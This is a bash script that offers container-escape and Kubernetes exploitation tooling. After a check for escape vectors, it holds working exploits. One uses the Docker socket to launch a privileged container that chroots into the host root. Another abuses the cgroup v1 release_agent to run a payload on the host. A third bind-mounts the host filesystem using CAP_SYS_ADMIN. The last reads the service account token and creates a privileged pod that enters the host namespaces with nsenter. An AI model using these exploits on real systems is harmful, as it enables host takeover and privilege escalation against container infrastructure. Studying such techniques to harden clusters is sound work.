#!/usr/bin/env bash
# ==============================================================================
# DOCKER/K8S ESCAPE — Container breakout and Kubernetes exploitation
# Usage: bash docker_escape.sh [--check] [--exploit TECHNIQUE]
# ==============================================================================
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../../lib/common.sh" 2>/dev/null || {
    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; NC='\033[0m'
    log() { echo -e "${GREEN}[✓]${NC} $*"; }
    info() { echo -e "${BLUE}[*]${NC} $*"; }
    warn() { echo -e "${YELLOW}[!]${NC} $*"; }
    err() { echo -e "${RED}[✗]${NC} $*" >&2; }
}

# ── Check if in container ──
in_container() {
    [[ -f /.dockerenv ]] || grep -q 'docker\|lxc' /proc/1/cgroup 2>/dev/null
}

# ── Check for escape vectors ──
check_docker_escape() {
    step "Container Escape Vector Detection"
    local vectors=0
    
    # 1. Docker socket exposure
    if [[ -S /var/run/docker.sock ]] || [[ -S /run/docker.sock ]]; then
        warn "Docker socket accessible: /var/run/docker.sock"
        ((vectors++))
    fi
    
    # 2. Privileged container
    if [[ -w /sys/fs/cgroup ]] || grep -q 'privileged' /proc/self/status 2>/dev/null; then
        warn "Container running in privileged mode"
        ((vectors++))
    fi
    
    # 3. Capabilities
    local caps
    caps=$(capsh --print 2>/dev/null | grep "Current:" | sed 's/.*=//')
    if echo "$caps" | grep -q -E '(CAP_SYS_ADMIN|CAP_DAC_OVERRIDE|CAP_SYS_RESOURCE|CAP_SYS_MODULE)'; then
        warn "Dangerous capabilities: $caps"
        ((vectors++))
    fi
    
    # 4. Host mount
    if mount | grep -q ' /host '; then
        warn "Host filesystem mounted"
        ((vectors++))
    fi
    
    # 5. Kernel modules
    if [[ -r /proc/modules ]] && grep -q '.' /proc/modules 2>/dev/null; then
        warn "Can read /proc/modules"
        ((vectors++))
    fi
    
    # 6. cgroup v1 release_agent
    if [[ -f /sys/fs/cgroup/release_agent ]]; then
        warn "cgroup v1 release_agent writable"
        ((vectors++))
    fi
    
    # 7. Container runtime
    command -v docker &>/dev/null && warn "Docker CLI available inside container" && ((vectors++))
    command -v kubectl &>/dev/null && warn "kubectl available inside container" && ((vectors++))
    
    # 8. K8s service account
    if [[ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]]; then
        warn "Kubernetes service account token present"
        ((vectors++))
    fi
    
    [[ $vectors -eq 0 ]] && log "No obvious escape vectors detected"
    echo "Total vectors: $vectors"
}

# ── Docker socket exploit ──
exploit_docker_socket() {
    step "Docker Socket Escape"
    local sock="${1:-/var/run/docker.sock}"
    
    if [[ ! -S "$sock" ]]; then
        err "Docker socket not found at $sock"
        return 1
    fi
    
    info "Launching privileged container with host mount..."
    
    # Create a privileged container with host root mount
    docker -H "unix://$sock" run --rm -it --privileged -v /:/host alpine chroot /host /bin/sh
}

# ── cgroup release_agent exploit ──
exploit_cgroup_release() {
    step "cgroup v1 release_agent Escape"
    
    if [[ ! -w /sys/fs/cgroup/release_agent ]]; then
        err "release_agent not writable"
        return 1
    fi
    
    local payload="/tmp/payload.sh"
    cat > "$payload" << 'PAYLOAD'
#!/bin/bash
# This runs as root on host
chroot /host /bin/bash -c "echo 'escaped' > /tmp/escape_proof.txt"
PAYLOAD
    chmod +x "$payload"
    
    echo "$payload" > /sys/fs/cgroup/release_agent
    mkdir -p /sys/fs/cgroup/test
    echo 1 > /sys/fs/cgroup/test/notify_on_release
    echo $$ > /sys/fs/cgroup/test/cgroup.procs
    
    sleep 2
    [[ -f /tmp/escape_proof.txt ]] && log "Escape successful! Check /tmp/escape_proof.txt on host"
}

# ── Exploit CAP_SYS_ADMIN ──
exploit_cap_sys_admin() {
    step "CAP_SYS_ADMIN Escape (mount)"
    
    # Try mounting host filesystem
    mkdir -p /tmp/host
    if mount -o bind / /tmp/host 2>/dev/null; then
        log "Host filesystem mounted at /tmp/host"
        echo "Run: chroot /tmp/host /bin/bash"
    else
        err "Mount failed"
    fi
}

# ── K8s service account abuse ──
exploit_k8s_sa() {
    step "Kubernetes Service Account Abuse"
    
    local token_file="/var/run/secrets/kubernetes.io/serviceaccount/token"
    [[ ! -f "$token_file" ]] && { err "No service account token"; return 1; }
    
    local token
    token=$(cat "$token_file")
    local api_server="${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}"
    local port="${KUBERNETES_SERVICE_PORT:-443}"
    
    info "Querying API server at $api_server..."
    
    # Check permissions
    curl -s -k -H "Authorization: Bearer $token" "https://$api_server:$port/api/v1/namespaces/default/pods" | jq .
    
    # Try to create privileged pod
    info "Attempting to create privileged pod..."
    cat << POD | curl -s -k -H "Authorization: Bearer $token" -H "Content-Type: application/json" -X POST -d @- "https://$api_server:$port/api/v1/namespaces/default/pods" | jq .
{
  "apiVersion": "v1",
  "kind": "Pod",
  "metadata": {"name": "escape-pod-$(date +%s)"},
  "spec": {
    "hostPID": true,
    "hostNetwork": true,
    "containers": [{
      "name": "escape",
      "image": "alpine",
      "command": ["/bin/sh", "-c", "nsenter -t 1 -m -u -n -i sh"],
      "securityContext": {"privileged": true}
    }],
    "restartPolicy": "Never"
  }
}
POD
}

# ── Check K8s RBAC ──
check_k8s_rbac() {
    step "Kubernetes RBAC Check"
    local token
    token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "")
    [[ -z "$token" ]] && { err "No K8s token"; return 1; }
    
    local api="${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}"
    local port="${KUBERNETES_SERVICE_PORT:-443}"
    
    info "Checking self subject access review..."
    curl -s -k -H "Authorization: Bearer $token" -H "Content-Type: application/json" -X POST -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"namespace":"default","verb":"create","resource":"pods"}}}' "https://$api:$port/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" | jq .
}

# ── Main ──────────────────────────────────────────────────────────────────────
main() {
    case "${1:-check}" in
        --check|check)
            in_container && log "Running inside container" || warn "Not in container"
            check_docker_escape
            ;;
        --docker-socket)
            exploit_docker_socket "${2:-/var/run/docker.sock}"
            ;;
        --cgroup)
            exploit_cgroup_release
            ;;
        --cap-sys-admin)
            exploit_cap_sys_admin
            ;;
        --k8s-sa)
            exploit_k8s_sa
            ;;
        --k8s-rbac)
            check_k8s_rbac
            ;;
        --all)
            exploit_docker_socket
            exploit_cgroup_release
            exploit_cap_sys_admin
            exploit_k8s_sa
            ;;
        *)
            cat << USAGE
Usage: $0 [OPTION]

Options:
  --check              Check for escape vectors (default)
  --docker-socket [SOCK]  Exploit Docker socket
  --cgroup             Exploit cgroup release_agent
  --cap-sys-admin      Exploit CAP_SYS_ADMIN (mount)
  --k8s-sa             Abuse K8s service account
  --k8s-rbac           Check K8s RBAC permissions
  --all                Try all exploits

USAGE
            ;;
    esac
}

main "$@"
